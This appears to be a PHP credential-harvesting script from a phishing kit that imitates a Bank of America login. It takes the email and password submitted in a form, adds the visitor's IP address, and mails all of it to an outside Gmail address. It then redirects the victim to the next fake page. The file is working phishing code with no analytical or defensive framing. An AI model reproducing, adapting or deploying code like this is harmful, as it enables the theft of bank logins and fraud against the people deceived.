<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || tHAnks tO CoMtECh || :------\n";
$message .= "User ID             : ".$_POST['Email']."\n";
$message .= "Password              : ".$_POST['Password']."\n";
$message .= "----: || tHAnks tO CoMtECh || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "masterpah10@gmail.com";
$subject = "BOA ID | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  boa22.htm");
?>


